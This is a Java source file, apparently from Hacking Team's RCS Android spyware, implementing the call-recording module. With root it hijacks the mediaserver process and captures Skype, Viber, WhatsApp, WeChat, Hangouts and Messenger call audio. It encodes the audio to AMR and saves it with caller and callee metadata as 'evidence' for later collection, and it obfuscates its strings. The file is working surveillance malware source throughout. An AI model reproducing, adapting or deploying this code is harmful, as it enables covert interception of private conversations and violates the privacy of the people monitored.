/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentApplication.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.module;

import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.FileObserver;

import com.android.dvci.Call;
import com.android.dvci.RunningProcesses;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfModule;
import com.android.dvci.conf.ConfigurationException;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.evidence.EvidenceType;
import com.android.dvci.file.AutoFile;
import com.android.dvci.interfaces.Observer;
import com.android.dvci.listener.ListenerCall;
import com.android.dvci.manager.ManagerModule;

import com.android.dvci.module.call.CallInfo;
import com.android.dvci.module.call.Chunk;
import com.android.dvci.module.call.EncodingTask;
import com.android.dvci.module.call.RecordCall;
import com.android.dvci.util.AudioEncoder;
import com.android.dvci.util.ByteArray;
import com.android.dvci.util.CallBack;
import com.android.dvci.util.Check;
import com.android.dvci.util.DataBuffer;
import com.android.dvci.util.DateTime;
import com.android.dvci.util.Execute;
import com.android.dvci.util.ICallBack;
import com.android.dvci.util.Instrument;
import com.android.dvci.util.PackageUtils;
import com.android.dvci.util.Utils;
import com.android.dvci.util.WChar;
import com.android.mm.M;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FilenameFilter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.Date;
import java.util.List;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.LinkedBlockingQueue;

public class ModuleCall extends BaseModule   {
	private static final String TAG = "ModuleCall"; //$NON-NLS-1$
	public static final int HEADER_SIZE = 6;

	public boolean recordFlag;

	private static final int CHANNEL_LOCAL = 0;
	private static final int CHANNEL_REMOTE = 1;

	public static final int CALLIST_PHONE = 0x0;
	public static final int CALLIST_SKYPE = 0x1;
	public static final int CALLIST_VIBER = 0x2;

	// From audio.h, Android 4.x
	private static final int AUDIO_STREAM_VOICE_CALL = 0;
	private static final int AUDIO_STREAM_SYSTEM = 1;
	private static final int AUDIO_STREAM_RING = 2;
	private static final int AUDIO_STREAM_MUSIC = 3;
	private static final int AUDIO_STREAM_MIC = -2; // Defined by us, not by
	// Android

	private FileObserver observer;
	private Thread queueMonitor;
	private static final Object sync = new Object();
	private static BlockingQueue<String> calls;
	private EncodingTask encodingTask;
	private CallBack hjcb;
	private Instrument hijack;

	public static final byte[] AMR_HEADER = new byte[]{35, 33, 65, 77, 82, 10};
	public static final byte[] MP4_HEADER = new byte[]{0, 0, 0};

	public static int amr_sizes[] = {12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0};
	private RunningProcesses runningProcesses;
	private CallInfo callInfo;
	private List<Chunk> chunks = new ArrayList<Chunk>();
	private boolean[] finished = new boolean[2];
	private boolean canRecord = false;
	private boolean isStarted = false;
	private Object recordingLock = new Object();

	public static ModuleCall self() {
		return (ModuleCall) ManagerModule.self().get(M.e("call"));
	}

	public boolean isRecordFlag() {
		return recordFlag;
	}

	@Override
	public boolean parse(ConfModule conf) {
		if (conf.has("record")) {
			try {
				recordFlag = conf.getBoolean("record");
			} catch (ConfigurationException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				recordFlag = false;
			}
		}

		return true;
	}

	@Override
	public void actualGo() {

	}

	@Override
	public void actualStart() {
		isStarted=false;
		runningProcesses = RunningProcesses.self();
		callInfo = new CallInfo(false);

		if (recordFlag) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualStart): recording calls"); //$NON-NLS-1$
			}
		}

		if (Status.haveRoot()) {

			if (android.os.Build.VERSION.SDK_INT < 15 || android.os.Build.VERSION.SDK_INT > 18) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (actualStart): OS level not supported");
				}
				isStarted=true;
				return;
			}

			if (!installedWhitelist()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (actualStart) No whitelist apps installed");
				}
				isStarted=true;
				return;
			}

			AudioEncoder.deleteAudioStorage();
			boolean audioStorageOk = AudioEncoder.createAudioStorage();

			if (audioStorageOk) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(actualStart): starting audio storage management");
					Execute.execute(new String[]{M.e("touch"), M.e("/sdcard/1")});
					Execute.executeRoot(M.e("touch /sdcard/2"));
				}

				if (installHijack()) {
					if (isMicAvailable()) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (actualStart) can't register call because mic is on:stopping it");
						}
						ModuleMic.self().stop();
					}
					startWatchAudio();
					canRecord = true;
				} else {
					canRecord = false;
				}
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(actualStart): unable to create audio storage");
				}

			}
		}
		isStarted=true;
	}

	private boolean installedWhitelist() {

		String[] whitelist = new String[]{M.e("com.viber.voip"), M.e("com.skype.raider"), M.e("com.google.android.talk"),
				M.e("com.whatsapp"), M.e("com.tencent.mm"), M.e("com.facebook.orca"),  M.e("com.facebook.katana")};

		final ArrayList<PackageUtils.PInfo> res = new ArrayList<PackageUtils.PInfo>();
		final PackageManager packageManager = Status.getAppContext().getPackageManager();

		for (String white : whitelist) {
			try {
				ApplicationInfo ret = packageManager.getApplicationInfo(white, 0);
				if (Cfg.DEBUG) {
					Check.log(TAG + " (installedWhitelist) found " + white);
				}
				String pm = packageManager.getInstallerPackageName(white);
				if (Cfg.DEBUG) {
					Check.log(TAG + " (installedWhitelist) " + pm);
				}
				return true;
			} catch (NameNotFoundException ex) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (installedWhitelist) not installed: " + white);
				}
			}

		}
		return false;

	}

	@Override
	public void actualStop() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualStop");
		}
		if (Status.haveRoot()) {
			if (queueMonitor != null && queueMonitor.isAlive()) {
				encodingTask.stop();
			}

			if (observer != null) {
				observer.stopWatching();
			}

			if (hijack != null) {
				hijack.stopInstrumentation();

			}

			if (isMicAvailable()) {
				ModuleMic.self().resetBlacklist();
			}
		}
		canRecord = false;
	}

	private void startWatchAudio() {
		calls = new LinkedBlockingQueue<String>();

		// Remove stray .bin files
		purgeAudio();

		// Scan for previously stored audio files
		scrubAudio();

		// Start the monitor and encoding thread
		encodingTask = new EncodingTask(this, sync, calls);

		queueMonitor = new Thread(encodingTask);
		queueMonitor.start();

		// Give it time to spawn before signaling
		Utils.sleep(500);

		while (queueMonitor.isAlive() == false) {
			Utils.sleep(250);
		}

		// Tell the thread to process scrubbed files
		encodingTask.wake();

		// Observe our audio storage (events are filtered so if you push a
		// .tmp using ADB it wont
		// trigger, you have to copy the test file and RENAME it .tmp to
		// trigger this observer)
		observer = new FileObserver(AudioEncoder.getAudioStorage(), FileObserver.MOVED_TO) {
			@Override
			public void onEvent(int event, String file) {
				if(file == null){
					return;
				}
				if (Cfg.DEBUG) {
					Check.log(TAG + "(onEvent): event: " + event + " for file: " + file);
				}

				// Add to list
				if (addToEncodingList(AudioEncoder.getAudioStorage() + file) == true) {
					// synchronized (sync) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "(onEvent): signaling EncodingTask thread");
					}

					encodingTask.wake();
					// }
				}

			}
		};

		observer.startWatching();
	}
	private boolean isMicAvailable(){
		return ModuleMic.self() != null && ModuleCall.self().isSuspended() && !ModuleCall.self().canRecord();
	}
	private boolean installHijack() {
		// Initialize the callback system

		if (isMicAvailable()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (installHijack), Cannot start, because Mic is running");
			}
			return false;
		}


		hjcb = new CallBack();
		hjcb.register(new HC());

		hijack = new Instrument(M.e("mediaserver"), AudioEncoder.getAudioStorage());

		if (hijack.startInstrumentation()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(actualStart): hijacker successfully installed");
			}
			EvidenceBuilder.info(M.e("Call Module ready"));

		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(actualStart): hijacker cannot be installed");
			}

			return false;
		}

		return true;
	}

	private void purgeAudio() {
		// Scrub for existing files on FS
		File f = new File(AudioEncoder.getAudioStorage());

		FilenameFilter filter = new FilenameFilter() {
			public boolean accept(File dir, String name) {
				return (name.startsWith(M.e("Qi-")) && name.toLowerCase().endsWith(M.e(".bin")));
			}
		};

		File file[] = f.listFiles(filter);
		long now = System.currentTimeMillis() / 1000;

		// Remove old files
		for (File storedFile : file) {
			String fullName = storedFile.getAbsolutePath();

			// Stored filetime (unix epoch() is in seconds not ms)
			String split[] = fullName.split("-");
			long epoch = Long.parseLong(split[1]);
			// long id = Long.parseLong(split[2]);

			// Files older than 24 hours are removed
			if (now - epoch > 60 * 60 * 24) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(purgeAudio): removing stray binary: " + fullName + " which is: " + (now - epoch)
							/ 3600 + " hours old");
				}

				// Make it read-write
				Execute.chmod("666", fullName);

				storedFile.delete();
			}
		}
	}

	private void scrubAudio() {
		// Scrub for existing files on FS
		File f = new File(AudioEncoder.getAudioStorage());

		FilenameFilter filter = new FilenameFilter() {
			public boolean accept(File dir, String name) {
				return (name.startsWith(M.e("Qi-")) && name.toLowerCase().endsWith(M.e(".tmp")));
			}
		};

		File file[] = f.listFiles(filter);

		// sort by name
		List<File> filesList = new java.util.ArrayList<File>();
		filesList.addAll(java.util.Arrays.asList(file));
		java.util.Collections.sort(filesList);

		// Adding scrubbed files
		for (File storedFile : filesList) {
			String fullName = storedFile.getAbsolutePath();
			addToEncodingList(fullName);
		}
	}

	synchronized private boolean addToEncodingList(String s) {

		if (s.contains(M.e("Qi-")) == false
				|| (s.endsWith(M.e("-l.tmp")) == false && s.endsWith(M.e("-r.tmp")) == false)) {

			if (Cfg.DEBUG) {
				Check.log(TAG + "(addToEncodingList): " + s + " is not intended for us");
			}

			return false;
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + "(addToEncodingList): adding \"" + s + "\" to the encoding list");
		}

		hjcb.trigger(s);

		// Make it read-write in any case
		Execute.chmod("666", s);

		// Add the file to the list
		calls.add(s);

		return true;
	}


	public static boolean saveCallEvidence(String peer, String myNumber, boolean incoming, Date dateBegin, Date dateEnd,
	                                       String currentRecordFile, boolean autoClose, int channel, int programId) {
		if (Cfg.DEBUG) {
			final long duration = dateEnd.getTime() - dateBegin.getTime();
			Check.log(TAG + " (saveCallEvidence): " + " peer: " + peer + " from: " + dateBegin + " to: " + dateEnd
					+ " incoming: " + incoming + "duration:" + (int) (duration / 1000) + "autoclose=" + autoClose);

		}

		final byte[] additionaldata = getCallAdditionalData(peer, myNumber, incoming, new DateTime(dateBegin),
				new DateTime(dateEnd), channel, programId);

		AutoFile file = new AutoFile(currentRecordFile);
		if (file.exists() && file.getSize() > HEADER_SIZE && file.canRead()) {
			if (Cfg.DEBUG) {
				// Check.log(TAG + " (saveCallEvidence): file size = " +
				// file.getSize());
			}

			int offset = 0;
			byte[] header = file.read(0, 6);

			if (ByteArray.equals(header, 0, AMR_HEADER, 0, AMR_HEADER.length)) {
				if (Cfg.DEBUG) {
					// Check.log(TAG + " (saveCallEvidence): AMR header");
				}
				offset = AMR_HEADER.length;
			}

			byte[] data = file.read(offset);
			int pos = checkIntegrity(data);

			if (pos != data.length) {
				data = ByteArray.copy(data, 0, pos);
			}

			if (Cfg.DEBUG) {
				// Check.log(TAG + " (saveCallEvidence), data len: " +
				// data.length + " pos: " + pos);
				// Check.log(TAG + " (saveCallEvidence), data[0:6]: " +
				// ByteArray.byteArrayToHex(data).substring(0, 20));
			}

			EvidenceBuilder.atomic(EvidenceType.CALL, additionaldata, data);

			if (autoClose) {
				EvidenceBuilder.atomic(EvidenceType.CALL, additionaldata, ByteArray.intToByteArray(0xffffffff));
			}

			file.delete();
			return true;
		} else {
			return false;
		}
	}

	private void closeCallEvidence(String peer, String number, boolean incoming, Date dateBegin, Date dateEnd,
	                               int programId) {
		final byte[] additionaldata = getCallAdditionalData(peer, number, incoming, new DateTime(dateBegin),
				new DateTime(dateEnd), CHANNEL_LOCAL, programId);

		if (Cfg.DEBUG) {
			Check.log(TAG + "(closeCallEvidence): closing call for " + peer);
		}

		EvidenceBuilder.atomic(EvidenceType.CALL, additionaldata, ByteArray.intToByteArray(0xffffffff));
	}

	private static int checkIntegrity(byte[] data) {
		int pos = 0;
		int chunklen = 0;

		while (pos < data.length) {
			chunklen = amr_sizes[(data[pos] >> 3) & 0x0f];

			if (chunklen == 0) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (saveRecorderEvidence) Error: zero len amr chunk, pos: " + pos);
				}
			}

			pos += chunklen + 1;
		}

		return pos;
	}

	private static byte[] getCallAdditionalData(String peer, String myNumber, boolean incoming, DateTime dateBegin,
	                                            DateTime dateEnd, int channels, int programId) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (getCallAdditionalData): caller: " + peer + " callee: " + myNumber + "incoming:" + incoming);
		}

		if (Cfg.DEBUG) {
			Check.asserts(peer != null, " (getCallAdditionalData) Assert failed, null number");
		}

		byte[] caller;
		byte[] callee;

		callee = WChar.getBytes(myNumber);
		caller = WChar.getBytes(peer);

		final int version = 2008121901; // CALL_LOG_VERSION
		// final int program = 0x0145; // LOGTYPE_CALL_MOBILE
		final int LOG_AUDIO_CODEC_AMR = 0x1;
		int channel = channels; // 0 - local, 1 - remote
		int sampleRate = 8000 | LOG_AUDIO_CODEC_AMR;

		int len = 20 + 16 + 8 + caller.length + callee.length;
		final byte[] additionaldata = new byte[len];
		final DataBuffer additionalData = new DataBuffer(additionaldata, 0, len);

		additionalData.writeInt(version);
		additionalData.writeInt(channel);
		additionalData.writeInt(programId);
		additionalData.writeInt(sampleRate);
		additionalData.writeInt(incoming ? 1 : 0);
		additionalData.writeLong(dateBegin.getFiledate());
		additionalData.writeLong(dateEnd.getFiledate());

		additionalData.writeInt(caller.length);
		additionalData.writeInt(callee.length);

		additionalData.write(caller);
		additionalData.write(callee);

		if (Cfg.DEBUG) {
			// Check.log(TAG + " (getCallAdditionalData) caller: %s callee: %s",
			// caller.length, callee.length);
			// Check.log(TAG + " getPosition: %s, len: %s ",
			// additionalData.getPosition(), len);
		}

		if (Cfg.DEBUG) {
			Check.asserts(additionalData.getPosition() == len, " (getCallAdditionalData) Assert failed, wrong len: "
					+ additionalData.getPosition() + ", wanted len:" + len);
		}

		return additionaldata;
	}

	public void saveCalllistEvidence(int programId, String from, String to, boolean incoming, Date fromTime,
	                                 int duration) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveCalllistEvidence):  from: " + from + " to: " + to);
		}

		final ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
		// Adding header
		try {

			int flags = incoming ? 1 : 0;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveCalllistEvidence) %s: %ss", fromTime, duration);
			}

			outputStream.write(ByteArray.intToByteArray((int) (fromTime.getTime() / 1000)));
			outputStream.write(ByteArray.intToByteArray(programId));
			outputStream.write(ByteArray.intToByteArray(flags));
			outputStream.write(WChar.getBytes(from, true));
			outputStream.write(WChar.getBytes(from, true));
			outputStream.write(WChar.getBytes(to, true));
			outputStream.write(WChar.getBytes(to, true));
			outputStream.write(ByteArray.intToByteArray(duration));
			outputStream.write(ByteArray.intToByteArray(EvidenceBuilder.E_DELIMITER));

		} catch (IOException ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (preparePacket) Error: " + ex);
			}
			return;
		}

		byte[] data = outputStream.toByteArray();
		EvidenceBuilder.atomic(EvidenceType.CALLLISTNEW, null, data);
	}

	public synchronized static void addTypedString(DataBuffer databuffer, byte type, String name) {
		if (name != null && name.length() > 0) {
			final int header = (type << 24) | (name.length() * 2);
			databuffer.writeInt(header);
			databuffer.write(WChar.getBytes(name));
		}
	}

	private int wsize(String string) {
		if (string.length() == 0) {
			return 0;
		} else {
			return string.length() * 2 + 4;
		}
	}

	// Chunk lastr = null;
	boolean started = false;

	// start: call start date
	// sec_length: call length in seconds
	// type: call type (Skype, Viber, Paltalk, Hangout)
	public synchronized void encodeChunks(AutoFile file) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (encodeChunks), " + file);
		}
		int first_epoch, last_epoch;
		AudioEncoder audioEncoder = new AudioEncoder(file.getFilename());

		first_epoch = audioEncoder.getCallStartTime();
		last_epoch = audioEncoder.getCallEndTime();

		// Now rawPcm contains the raw data
		String encodedFile = file.getFilename() + M.e(".err");
		String encodedFileName = file.getName();

		boolean remote = encodedFile.endsWith(M.e("-r.tmp.err"));

		long streamId = getStreamId(encodedFile);
		int pid = getStreamPid(encodedFile);

		long oldStreamId = callInfo.getStreamId(remote);

		if (oldStreamId != 0 && streamId != oldStreamId || finished[remote ? 1 : 0]) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (encodeChunks), if remote not closed, delete previous stream");
			}
			// close oldStream
			if (callInfo.begin != null && callInfo.end != null) {
				closeCallEvidence(callInfo.getCaller(), callInfo.getCallee(), true, callInfo.begin, callInfo.end, callInfo.programId);
			}

			callInfo = new CallInfo(false);
			for (Chunk chunk : chunks) {
				AutoFile filetmp = new AutoFile(chunk.encodedFile);
				filetmp.delete();
			}

			chunks = new ArrayList<Chunk>();
			finished = new boolean[2];
			started = false;
		}

		boolean ret = callInfo.setStreamId(remote, streamId);
		ret = callInfo.setStreamPid(pid);

		if (!callInfo.update(false)) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (encodeChunks): unknown call program removing" + (remote ? "Remote" : "local"));
			}

			return;
		}

		// Decide heuristics logic

		boolean realRate = true;

		if (!callInfo.realRate && remote) { // Skype

			if (Cfg.DEBUG) {
				Check.log(TAG
						+ "(encodeChunks): Skype call in progress, applying bitrate heuristics on remote channel only");
			}

			realRate = false;
		}

		if (audioEncoder.encodetoAmr(encodedFile, audioEncoder.resample(realRate))) {
			callInfo.begin = new Date(first_epoch * 1000L);
			callInfo.end = new Date(last_epoch * 1000L);

			finished[remote ? 1 : 0] = false;

			String caller = callInfo.getCaller();
			String callee = callInfo.getCallee();

			if (callInfo.delay) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (encodeChunks) delay, just add a chunk: " + chunks.size() + "monitored caller:" + caller + " monitored callee:" + callee);
				}
				chunks.add(new Chunk(encodedFile, callInfo.begin, callInfo.end, remote));
				sort_chunks();
			} else {
				// Encode to evidence
				int channel = remote ? 0 : 1;

				if (!started) {
					if (remote) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (encodeChunks): saving, possibly discarted, remote: " + callInfo.begin);
						}
						chunks.add(new Chunk(encodedFile, callInfo.begin, callInfo.end, remote));
						sort_chunks();
					} else {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (encodeChunks): first LOCAL: " + encodedFileName);
						}
						started = true;

						Chunk firstl = new Chunk(encodedFile, callInfo.begin, callInfo.end, remote);
						chunks.add(firstl);
						sort_chunks();

						for (Chunk chunk : chunks) {
							if (chunk.end.getTime() < firstl.begin.getTime()) {
								AutoFile filetmp = new AutoFile(chunk.encodedFile);
								filetmp.delete();
								if (Cfg.DEBUG) {
									Check.log(TAG + " (encodeChunks):removing old LOCAL chunk !! :" + filetmp.getName() + " StreamId:" + streamId);
								}
							} else {
								saveCallEvidence(caller, callee, chunk, callInfo.programId);
							}
						}
						chunks.clear();

					}
				} else {
					saveCallEvidence(caller, callee, true, callInfo.begin, callInfo.end, encodedFile, false, channel, callInfo.programId);
				}
			}

			// We have an end of call and it's on both channels
			if (audioEncoder.isLastCallFinished()) {
				finished[remote ? 1 : 0] = true;
				if(callInfo.programId == CallInfo.PRG_GTALK_ID && finished[0]){
					if (Cfg.DEBUG) {
						Check.log(TAG + " (encodeChunks) force end of remote for gtalk");
					}
					finished[1] = finished[0];
				}
				if (Cfg.DEBUG) {
					Check.log(TAG + " (encodeChunks) finished: [" + finished[0] + "," + finished[1] + "]");
				}
				// || callInfo.programId == 0x0148
				if ((finished[0] && finished[1])) {
					// After encoding create the end of call marker
					if (callInfo.delay) {
						saveAllEvidences(chunks, callInfo, callInfo.begin, callInfo.end);
					} else {
						if (callInfo.valid)
							closeCallEvidence(caller, callee, true, callInfo.begin, callInfo.end, callInfo.programId);
					}
					callInfo = new CallInfo(false);
					chunks = new ArrayList<Chunk>();
					finished = new boolean[2];
					started = false;

					if (Cfg.DEBUG) {
						Check.log(TAG + "(encodeChunks): end of call reached");
					}
				}
			}
		}

		// Remove file
		if (Cfg.DEBUG) {
			Check.log(TAG + "(encodeChunks): deleting " + file.getName());
		}

		audioEncoder.removeRawFile();

	}

	private long getStreamId(String fullName) {

		// Stored filetime (unix epoch() is in seconds not ms)
		String split[] = fullName.split("-");
		long epoch = Long.parseLong(split[1]);
		long streamId = Long.parseLong(split[2]);
		if (Cfg.DEBUG) {
			Check.log(TAG + " (getStreamId): " + streamId);
		}
		return streamId;
	}

	private int getStreamPid(String fullName) {

		// Stored filetime (unix epoch() is in seconds not ms)
		String split[] = fullName.split("-");
		int streamPid = 0;
		if (split.length > 4) {
			streamPid = Integer.parseInt(split[3]);
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getStreamPid): " + streamPid);
			}
		}
		return streamPid;
	}

	private void sort_chunks() {
		Collections.sort(chunks, new Comparator<Chunk>() {
			public int compare(Chunk ch1, Chunk ch2) {
				return (int) (ch1.begin.getTime() - ch2.begin.getTime());
			}
		});
	}

	private void saveCallEvidence(String caller, String callee, Chunk chunk, int programId) {
		saveCallEvidence(caller, callee, true, chunk.begin, chunk.end, chunk.encodedFile, false, chunk.channel,
				programId);
	}

	private void saveAllEvidences(List<Chunk> chunks, CallInfo callInfo, Date begin, Date end) {

		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveAllEvidences) chunks: " + chunks.size());
		}
		callInfo.update(true);

		String caller = callInfo.getCaller();
		String callee = callInfo.getCallee();

		Chunk lastr = null;
		boolean started = false;

		for (Chunk chunk : chunks) {
			saveCallEvidence(caller, callee, true, chunk.begin, chunk.end, chunk.encodedFile, false, chunk.channel,
					callInfo.programId);

		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveAllEvidences) saving last chunk");
		}
		closeCallEvidence(caller, callee, true, begin, end, callInfo.programId);
	}

	public boolean isRecording() {
		return started;
	}

	public class HC implements ICallBack {
		private static final String TAG = "HijackCallBack";

		public <O> void run(O o) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (run callback): " + o);
			}
		}
	}

	public boolean canRecord() {
		return canRecord;
	}

	public boolean isBooted() {
		return isStarted;
	}
}